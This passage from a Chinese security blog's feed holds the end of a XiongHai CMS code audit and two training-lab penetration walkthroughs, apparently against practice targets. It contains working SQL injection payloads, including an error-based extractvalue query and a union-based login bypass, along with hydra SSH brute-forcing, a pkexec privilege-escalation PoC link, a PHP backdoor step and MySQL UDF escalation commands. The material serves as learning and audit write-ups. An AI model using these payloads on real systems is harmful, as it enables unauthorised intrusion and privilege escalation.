class="keyword">die</span>(<span class="string">&#x27;SQL语句有误：&#x27;</span>.mysql_error());</span><br><span class="line"><span class="variable">$content</span> = mysql_fetch_array(<span class="variable">$resul</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$navid</span>=<span class="variable">$content</span>[<span class="string">&#x27;navclass&#x27;</span>];</span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;SELECT * FROM navclass WHERE id=&#x27;<span class="subst">$navid</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$resul</span> = mysql_query(<span class="variable">$query</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;SQL语句有误：&#x27;</span>.mysql_error());</span><br><span class="line"><span class="variable">$navs</span> = mysql_fetch_array(<span class="variable">$resul</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//浏览计数</span></span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;UPDATE content SET hit = hit+1 WHERE id=<span class="subst">$id</span>&quot;</span>;</span><br><span class="line">@mysql_query(<span class="variable">$query</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;修改错误：&#x27;</span>.mysql_error());</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>造成update语句处的注入，当然这里<code>@mysql_query($query) or die(&#39;修改错误：&#39;.mysql_error());</code>会输出错误，所以报错注入就完事啦</p><p><img src="/2022/06/16/year/2022/6/Y4%E6%95%99%E4%BD%A0%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B9%8B%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/6.png"></p><p>有了sql注入，我们就能尝试拿到管理用户密码，在最上面我们说了密码只是简单md5所以可能造成撞库获取明文的风险</p><h3 id="验证码逻辑问题"><a href="#验证码逻辑问题" class="headerlink" title="验证码逻辑问题"></a>验证码逻辑问题</h3><p>可以看到这里验证码引入code.class.php</p><p><img src="/2022/06/16/year/2022/6/Y4%E6%95%99%E4%BD%A0%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B9%8B%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/11.png"></p><p>而这个文件直接把验证码放入session，这里还没啥问题</p><p><img src="/2022/06/16/year/2022/6/Y4%E6%95%99%E4%BD%A0%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B9%8B%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/12.png"></p><p>这里只是验证是否一致，如果一致也不会刷新，所以我们可以通过一个验证码来一直实现爆破需要验证码的页面如登陆等等</p><p><img src="/2022/06/16/year/2022/6/Y4%E6%95%99%E4%BD%A0%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B9%8B%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/13.png"></p><h3 id="前台SQL注入"><a href="#前台SQL注入" class="headerlink" title="前台SQL注入"></a>前台SQL注入</h3><p>很多参数都没过滤，随便注入了，只是有个限制就是需要验证码</p><p><img src="/2022/06/16/year/2022/6/Y4%E6%95%99%E4%BD%A0%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B9%8B%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/9.png"></p><p>配合上面验证码的逻辑漏洞可以实现随便注入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cid=<span class="number">0</span>&amp;content=<span class="number">2</span>dsads笑死a333%<span class="number">40</span>&amp;jz=<span class="number">1</span>&amp;mail=<span class="string">&#x27; and extractvalue(0x0a,concat(0x0a,(select+version()))))%23&amp;name=asdas&amp;randcode=5x94&amp;save=提交&amp;tz=1&amp;url=asdsadsa</span></span><br></pre></td></tr></table></figure><p><img src="/2022/06/16/year/2022/6/Y4%E6%95%99%E4%BD%A0%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B9%8B%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/10.png"></p><h3 id="万能密码进入后台"><a href="#万能密码进入后台" class="headerlink" title="万能密码进入后台"></a>万能密码进入后台</h3><p>和普通万能密码不一样，它需要查询到数据然后与结果中密码的比对<img src="/2022/06/16/year/2022/6/Y4%E6%95%99%E4%BD%A0%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97%E4%B9%8B%E7%86%8A%E6%B5%B7CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/17.png"></p><p>因此只需要联合查询构造虚假数据即可</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST数据</span><br><span class="line">user=<span class="number">1</span><span class="string">&#x27; union select 1,2,&#x27;</span>y4tacker<span class="string">&#x27;,&#x27;</span>c4ca4238a0b923820dcc509a6f75849<span class="string">b&#x27;,5,6,7,8%23</span></span><br><span class="line"><span class="string">password=1</span></span><br></pre></td></tr></table></figure><p>其中<code>md5(1)=c4ca4238a0b923820dcc509a6f75849b</code></p><h2 id="后台"><a href="#后台" class="headerlink" title="后台"></a>后台</h2><p>后台SQL注入有很多就不列举出来了没意义，其他的大概看了下后台没有文件上传,内嵌插件也不能上传(白名单的限制无法突破，也没有文件包含就没啥意义了)，除此以外还有个SSRF，但单个系统的SSRF没啥太大价值，除非有其他内网系统才能凸显其价值</p><h2 id="一个可行的RCE方案"><a href="#一个可行的RCE方案" class="headerlink" title="一个可行的RCE方案"></a>一个可行的RCE方案</h2><p>毕竟是熊海CMS，要求是低版本php5，那么如果php版本小于5.2.8，linux 需要文件名长于 4096，windows 需要长于 256，超过部分会被丢弃从而实现文件包含绕过后缀.php限制，这样我们就可以传图片马即可</p><p>又或者通过00截断控制后缀，不过也是有限制的，在 php 版本小于 5.3.4 而且GPC = Off 允许使用%00 截断，在使用 include 等文件包含函数，可以截 断文件名，截断会受 gpc 影响，如果 gpc 为 On 时，%00 会被转以成\0 截断会失败。</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://paper.seebug.org/1112/">https://paper.seebug.org/1112/</a></p><p><a href="https://github.com/Al1ex/Rogue-MySql-Server">https://github.com/Al1ex/Rogue-MySql-Server</a></p>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>实训打靶记录(二)</title>
      <link href="/2022/06/14/year/2022/6/%E5%AE%9E%E8%AE%AD%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95-%E4%BA%8C/"/>
      <url>/2022/06/14/year/2022/6/%E5%AE%9E%E8%AE%AD%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95-%E4%BA%8C/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="实训靶机-2"><a href="#实训靶机-2" class="headerlink" title="实训靶机-2"></a>实训靶机-2</h1><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><h3 id="端口搜集"><a href="#端口搜集" class="headerlink" title="端口搜集"></a>端口搜集</h3><p>首先通过nmap扫描靶机，发现两个端口22和3000，其中3000是一个web服务</p><p><img src="/2022/06/14/year/2022/6/%E5%AE%9E%E8%AE%AD%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95-%E4%BA%8C/1.png"></p><p>通过dirsearch发现两个可以目录，居然是nodejs的项目</p><p><img src="/2022/06/14/year/2022/6/%E5%AE%9E%E8%AE%AD%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95-%E4%BA%8C/2.png"></p><h3 id="web服务搜集"><a href="#web服务搜集" class="headerlink" title="web服务搜集"></a>web服务搜集</h3><p>顺便记录下首页出现的三个用户名tomcat、mark、rastating</p><p><img src="/2022/06/14/year/2022/6/%E5%AE%9E%E8%AE%AD%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95-%E4%BA%8C/3.png"></p><p>简单在github上面搜索下最关键的特征词发现没有这个项目</p><p><img src="/2022/06/14/year/2022/6/%E5%AE%9E%E8%AE%AD%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95-%E4%BA%8C/4.png"></p><h3 id="源码泄漏"><a href="#源码泄漏" class="headerlink" title="源码泄漏"></a>源码泄漏</h3><p>f12发现下面疑似接口泄漏</p><p><img src="/2022/06/14/year/2022/6/%E5%AE%9E%E8%AE%AD%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95-%E4%BA%8C/5.png"></p><p>但是点进去发现原来是故意给了源码啊</p><p><img src="/2022/06/14/year/2022/6/%E5%AE%9E%E8%AE%AD%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95-%E4%BA%8C/6.png"></p><h3 id="用户信息泄漏"><a href="#用户信息泄漏" class="headerlink" title="用户信息泄漏"></a>用户信息泄漏</h3><p>简单访问一下发现泄漏了用户名和密码</p><p><img src="/2022/06/14/year/2022/6/%E5%AE%9E%E8%AE%AD%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95-%E4%BA%8C/7.png"></p><p>之后发现去掉latest以后还出现了admin</p><p><img src="/2022/06/14/year/2022/6/%E5%AE%9E%E8%AE%AD%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95-%E4%BA%8C/8.png"></p><p>admin密码撞库拿到了密码manchester，拿着这个去登陆</p><p><img src="/2022/06/14/year/2022/6/%E5%AE%9E%E8%AE%AD%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95-%E4%BA%8C/9.png"></p><h2 id="admin用户登陆"><a href="#admin用户登陆" class="headerlink" title="admin用户登陆"></a>admin用户登陆</h2><p>发现登陆后有个下载备份</p><p><img src="/2022/06/14/year/2022/6/%E5%AE%9E%E8%AE%AD%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95-%E4%BA%8C/10.png"></p><p>看了下请求信息，发现是get请求并且无传参，看来无法任意文件下载</p><p><img src="/2022/06/14/year/2022/6/%E5%AE%9E%E8%AE%AD%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95-%E4%BA%8C/11.png"></p><h3 id="获得备份文件"><a href="#获得备份文件" class="headerlink" title="获得备份文件"></a>获得备份文件</h3><p>直接修改为zip发现打不开</p><p><img src="/2022/06/14/year/2022/6/%E5%AE%9E%E8%AE%AD%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95-%E4%BA%8C/12.png"></p><p>直接打开发现是疑似base64</p><p><img src="/2022/06/14/year/2022/6/%E5%AE%9E%E8%AE%AD%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95-%E4%BA%8C/13.png"></p><p>果然是，然后还发现有密码</p><p><img src="/2022/06/14/year/2022/6/%E5%AE%9E%E8%AE%AD%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95-%E4%BA%8C/14.png"></p><h4 id="爆破密码"><a href="#爆破密码" class="headerlink" title="爆破密码"></a>爆破密码</h4><p>用archpr发现爆破一年应该不能爆破，尝试下用rockyou字典得到了密码magicword</p><p><img src="/2022/06/14/year/2022/6/%E5%AE%9E%E8%AE%AD%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95-%E4%BA%8C/15.png"></p><p>成功获取源码</p><h3 id="数据库配置信息泄漏"><a href="#数据库配置信息泄漏" class="headerlink" title="数据库配置信息泄漏"></a>数据库配置信息泄漏</h3><p>发现敏感信息泄漏<code>mark:5AYRft73VtFpc84k</code></p><p><img src="/2022/06/14/year/2022/6/%E5%AE%9E%E8%AE%AD%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95-%E4%BA%8C/16.png"></p><h2 id="登陆ssh"><a href="#登陆ssh" class="headerlink" title="登陆ssh"></a>登陆ssh</h2><p>按照套路，尝试使用用户mark登陆ssh，登陆成功</p><p><img src="/2022/06/14/year/2022/6/%E5%AE%9E%E8%AE%AD%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95-%E4%BA%8C/17.png"></p><p>whoami发现是普通用户权限</p><p><img src="/2022/06/14/year/2022/6/%E5%AE%9E%E8%AE%AD%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95-%E4%BA%8C/19.png"></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="尝试寻找特权指令"><a href="#尝试寻找特权指令" class="headerlink" title="尝试寻找特权指令"></a>尝试寻找特权指令</h3><p>查看有无特权指令</p><p><img src="/2022/06/14/year/2022/6/%E5%AE%9E%E8%AE%AD%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95-%E4%BA%8C/18.png"></p><h3 id="尝试suid提权-pkexec成功"><a href="#尝试suid提权-pkexec成功" class="headerlink" title="尝试suid提权-pkexec成功"></a>尝试suid提权-pkexec成功</h3><p>尝试suid提权,发现pkexec，联想到前段时间的pkexec本地提权</p><p><img src="/2022/06/14/year/2022/6/%E5%AE%9E%E8%AE%AD%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95-%E4%BA%8C/20.png"></p><p>影响版本</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">CentOS系列：    </span><br><span class="line">CentOS <span class="number">6</span>：polkit-<span class="number">0</span>.<span class="number">96</span>-<span class="number">11</span>.el6_10.<span class="number">2</span>    </span><br><span class="line">CentOS <span class="number">7</span>：polkit-<span class="number">0</span>.<span class="number">112</span>-<span class="number">26</span>.el7_9.<span class="number">1</span>       </span><br><span class="line">CentOS <span class="number">8</span>.<span class="number">0</span>：polkit-<span class="number">0</span>.<span class="number">115</span>-<span class="number">13</span>.el8_5.<span class="number">1</span>      </span><br><span class="line">CentOS <span class="number">8</span>.<span class="number">2</span>：polkit-<span class="number">0</span>.<span class="number">115</span>-<span class="number">11</span>.el8_2.<span class="number">2</span>        </span><br><span class="line">CentOS <span class="number">8</span>.<span class="number">4</span>：polkit-<span class="number">0</span>.<span class="number">115</span>-<span class="number">11</span>.el8_4.<span class="number">2</span>      </span><br><span class="line"></span><br><span class="line">Ubuntu系列：   </span><br><span class="line">Ubuntu <span class="number">20</span>.<span class="number">04</span> LTS：policykit-<span class="number">1</span> - <span class="number">0</span>.<span class="number">105</span>-<span class="number">26</span>ubuntu1.<span class="number">2</span>  </span><br><span class="line">Ubuntu <span class="number">18</span>.<span class="number">04</span> LTS：policykit-<span class="number">1</span> - <span class="number">0</span>.<span class="number">105</span>-<span class="number">20</span>ubuntu0.<span class="number">18</span>.<span class="number">04</span>.<span class="number">6</span>  </span><br><span class="line">Ubuntu <span class="number">16</span>.<span class="number">04</span> ESM：policykit-<span class="number">1</span> - <span class="number">0</span>.<span class="number">105</span>-<span class="number">14</span>.<span class="number">1</span>ubuntu0.<span class="number">5</span>+esm1  </span><br><span class="line">Ubuntu <span class="number">14</span>.<span class="number">04</span> ESM：policykit-<span class="number">1</span> - <span class="number">0</span>.<span class="number">105</span>-<span class="number">4</span>ubuntu3.<span class="number">14</span>.<span class="number">04</span>.<span class="number">6</span>+esm1  </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>发现版本对上了</p><p><img src="/2022/06/14/year/2022/6/%E5%AE%9E%E8%AE%AD%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95-%E4%BA%8C/21.png"></p><p>网上下个poc<a href="https://github.com/berdav/CVE-2021-4034%EF%BC%8C%E6%8F%90%E6%9D%83%E6%88%90%E5%8A%9F">https://github.com/berdav/CVE-2021-4034，提权成功</a></p><p><img src="/2022/06/14/year/2022/6/%E5%AE%9E%E8%AE%AD%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95-%E4%BA%8C/22.png"></p><h3 id="获取交互式shell"><a href="#获取交互式shell" class="headerlink" title="获取交互式shell"></a>获取交互式shell</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pyt;pty.spwan(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="/2022/06/14/year/2022/6/%E5%AE%9E%E8%AE%AD%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95-%E4%BA%8C/23.png"></p><h2 id="获取flag"><a href="#获取flag" class="headerlink" title="获取flag"></a>获取flag</h2><p>一个是在<code>/root/root.txt</code> ;</p><p><img src="/2022/06/14/year/2022/6/%E5%AE%9E%E8%AE%AD%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95-%E4%BA%8C/24.png"></p><p>另一个是在<code>/home/tom/user.txt</code>;</p><p><img src="/2022/06/14/year/2022/6/%E5%AE%9E%E8%AE%AD%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95-%E4%BA%8C/25.png"></p>]]></content>
      
      
      <categories>
          
          <category> PTES </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PTES </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>实训打靶记录(一)</title>
      <link href="/2022/06/14/year/2022/6/%E5%AE%9E%E8%AE%AD%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95-%E4%B8%80/"/>
      <url>/2022/06/14/year/2022/6/%E5%AE%9E%E8%AE%AD%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95-%E4%B8%80/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="实训靶机-1"><a href="#实训靶机-1" class="headerlink" title="实训靶机-1"></a>实训靶机-1</h1><p>实训期间先搞开发再搞了渗透，现在开始渗透阶段了</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>发现三个端口，暴露了web服务</p><p><img src="/2022/06/14/year/2022/6/%E5%AE%9E%E8%AE%AD%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95-%E4%B8%80/1.png"></p><p>用dirsearch进行扫描，发现有vendor目录，里面可能有composer生成的铭感信息</p><p><img src="/2022/06/14/year/2022/6/%E5%AE%9E%E8%AE%AD%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95-%E4%B8%80/2.png"></p><p>发现配置错误，正好能访问对应文件</p><p><img src="/2022/06/14/year/2022/6/%E5%AE%9E%E8%AE%AD%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95-%E4%B8%80/3.png"></p><h3 id="获得web目录绝对路径"><a href="#获得web目录绝对路径" class="headerlink" title="获得web目录绝对路径"></a>获得web目录绝对路径</h3><p><img src="/2022/06/14/year/2022/6/%E5%AE%9E%E8%AE%AD%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95-%E4%B8%80/4.png"></p><h3 id="PHPmailer版本"><a href="#PHPmailer版本" class="headerlink" title="PHPmailer版本"></a>PHPmailer版本</h3><p>5.2.16</p><p><img src="/2022/06/14/year/2022/6/%E5%AE%9E%E8%AE%AD%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95-%E4%B8%80/5.png"></p><h4 id="存在漏洞利用点"><a href="#存在漏洞利用点" class="headerlink" title="存在漏洞利用点"></a>存在漏洞利用点</h4><p>kali里面发现漏洞利用点</p><p><img src="/2022/06/14/year/2022/6/%E5%AE%9E%E8%AE%AD%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95-%E4%B8%80/6.png"></p><h3 id="存在wordpress站点"><a href="#存在wordpress站点" class="headerlink" title="存在wordpress站点"></a>存在wordpress站点</h3><p>首页点击BLOG跳转到wordpress页面</p><p><img src="/2022/06/14/year/2022/6/%E5%AE%9E%E8%AE%AD%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95-%E4%B8%80/7.png"></p><h4 id="wpscan尝试扫描漏洞"><a href="#wpscan尝试扫描漏洞" class="headerlink" title="wpscan尝试扫描漏洞"></a>wpscan尝试扫描漏洞</h4><p>发现两个用户steven与michael</p><p><img src="/2022/06/14/year/2022/6/%E5%AE%9E%E8%AE%AD%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95-%E4%B8%80/8.png"></p><h2 id="尝试爆破ssh密码"><a href="#尝试爆破ssh密码" class="headerlink" title="尝试爆破ssh密码"></a>尝试爆破ssh密码</h2><p>收集到的两个用户进行利用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L user.txt -P /usr/share/wordlists/rockyou.txt -F -V 192.168.10.131 ssh</span><br></pre></td></tr></table></figure><p>成功得到michael的密码Michael</p><p><img src="/2022/06/14/year/2022/6/%E5%AE%9E%E8%AE%AD%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95-%E4%B8%80/9.png"></p><h2 id="尝试ssh远程登录"><a href="#尝试ssh远程登录" class="headerlink" title="尝试ssh远程登录"></a>尝试ssh远程登录</h2><p><img src="/2022/06/14/year/2022/6/%E5%AE%9E%E8%AE%AD%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95-%E4%B8%80/10.png"></p><h2 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h2><h3 id="查看mysql是否运行"><a href="#查看mysql是否运行" class="headerlink" title="查看mysql是否运行"></a>查看mysql是否运行</h3><p><img src="/2022/06/14/year/2022/6/%E5%AE%9E%E8%AE%AD%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95-%E4%B8%80/11.png"></p><h3 id="获取mysql密码"><a href="#获取mysql密码" class="headerlink" title="获取mysql密码"></a>获取mysql密码</h3><p>在wordpress目录下wp-config.php获得了root用户的密码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** MySQL database username */</span></span><br><span class="line">define(<span class="string">&#x27;DB_USER&#x27;</span>, <span class="string">&#x27;root&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/** MySQL database password */</span></span><br><span class="line">define(<span class="string">&#x27;DB_PASSWORD&#x27;</span>, <span class="string">&#x27;R@v3nSecurity&#x27;</span>);</span><br></pre></td></tr></table></figure><h3 id="登陆mysql"><a href="#登陆mysql" class="headerlink" title="登陆mysql"></a>登陆mysql</h3><p><img src="/2022/06/14/year/2022/6/%E5%AE%9E%E8%AE%AD%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95-%E4%B8%80/12.png"></p><h3 id="查看数据库"><a href="#查看数据库" class="headerlink" title="查看数据库"></a>查看数据库</h3><p>show database</p><p><img src="/2022/06/14/year/2022/6/%E5%AE%9E%E8%AE%AD%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95-%E4%B8%80/13.png"></p><h3 id="查看wordpress当中的表"><a href="#查看wordpress当中的表" class="headerlink" title="查看wordpress当中的表"></a>查看wordpress当中的表</h3><p><img src="/2022/06/14/year/2022/6/%E5%AE%9E%E8%AE%AD%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95-%E4%B8%80/14.png"></p><h3 id="查看数据库用户并破解密码"><a href="#查看数据库用户并破解密码" class="headerlink" title="查看数据库用户并破解密码"></a>查看数据库用户并破解密码</h3><p><img src="/2022/06/14/year/2022/6/%E5%AE%9E%E8%AE%AD%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95-%E4%B8%80/15.png"></p><p> $P$BqfBDRL7nB8b5G0aPRMiL.iSsn5YD00去somd5查询后得到steven密码pink84</p><h2 id="ssh登陆steven用户并获取交互式shell"><a href="#ssh登陆steven用户并获取交互式shell" class="headerlink" title="ssh登陆steven用户并获取交互式shell"></a>ssh登陆steven用户并获取交互式shell</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="/2022/06/14/year/2022/6/%E5%AE%9E%E8%AE%AD%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95-%E4%B8%80/16.png"></p><h3 id="sudo-l通过特权指令提权"><a href="#sudo-l通过特权指令提权" class="headerlink" title="sudo -l通过特权指令提权"></a>sudo -l通过特权指令提权</h3><p><img src="/2022/06/14/year/2022/6/%E5%AE%9E%E8%AE%AD%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95-%E4%B8%80/17.png"></p><p>提权</p><p><img src="/2022/06/14/year/2022/6/%E5%AE%9E%E8%AE%AD%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95-%E4%B8%80/18.png"></p><h2 id="第二种方式：phpmailer获取web权限"><a href="#第二种方式：phpmailer获取web权限" class="headerlink" title="第二种方式：phpmailer获取web权限"></a>第二种方式：phpmailer获取web权限</h2><p>这里用python脚本提权</p><p><img src="/2022/06/14/year/2022/6/%E5%AE%9E%E8%AE%AD%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95-%E4%B8%80/19.png"></p><p>这里对其修改改为一个php后门，方便后渗透</p><p><img src="/2022/06/14/year/2022/6/%E5%AE%9E%E8%AE%AD%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95-%E4%B8%80/20.png"></p><p>之后利用这个backdoor.php，获取虚拟终端，发现mysql为root用户运行，如果能通过mysql提权限那么就会获得root用户权限</p><p><img src="/2022/06/14/year/2022/6/%E5%AE%9E%E8%AE%AD%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95-%E4%B8%80/23.png"></p><h3 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h3><p>在蚁剑使用mysql连接插件</p><p><img src="/2022/06/14/year/2022/6/%E5%AE%9E%E8%AE%AD%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95-%E4%B8%80/21.png"></p><h4 id="mysql查询系统相关信息"><a href="#mysql查询系统相关信息" class="headerlink" title="mysql查询系统相关信息"></a>mysql查询系统相关信息</h4><p>得到mysql版本</p><p><img src="/2022/06/14/year/2022/6/%E5%AE%9E%E8%AE%AD%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95-%E4%B8%80/22.png"></p><p>获取到系统为64位系统</p><p><img src="/2022/06/14/year/2022/6/%E5%AE%9E%E8%AE%AD%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95-%E4%B8%80/24.png"></p><p>查看写入权限反正是root，就算无也可以改，发现可以写</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show global variables like &#x27;%secure%&#x27;;</span><br></pre></td></tr></table></figure><p><img src="/2022/06/14/year/2022/6/%E5%AE%9E%E8%AE%AD%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95-%E4%B8%80/25.png"></p><p>查看mysql插件目录地址</p><p><img src="/2022/06/14/year/2022/6/%E5%AE%9E%E8%AE%AD%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95-%E4%B8%80/26.png"></p><p>udf一把梭哈</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT  INTO DUMPFILE &#x27;/usr/lib/mysql/plugin/udf_y4.so&#x27;;</span><br></pre></td></tr></table></figure><p>之后创建一个用户自定义函数即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE FUNCTION sys_eval RETURNS STRING SONAME &#x27;udf_y4.so&#x27;;</span><br></pre></td></tr></table></figure><p><img src="/2022/06/14/year/2022/6/%E5%AE%9E%E8%AE%AD%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95-%E4%B8%80/27.png"></p><p>成功获得root权限</p><p><img src="/2022/06/14/year/2022/6/%E5%AE%9E%E8%AE%AD%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95-%E4%B8%80/28.png"></p><h2 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h2><p>flag1{b9bbcb33e11b80be759c4e844862482d} 首页service.html</p><p><img src="/2022/06/14/year/2022/6/%E5%AE%9E%E8%AE%AD%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95-%E4%B8%80/flag1.png"></p><p>flag2{fc3fd58dcdad9ab23faca6e9a36e581c} /var/www/flag2.txt</p><p><img src="/2022/06/14/year/2022/6/%E5%AE%9E%E8%AE%AD%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95-%E4%B8%80/flag2.png"></p><p>flag3{afc01ab56b50591e7dccf93122770cd2} 数据库</p><p><img 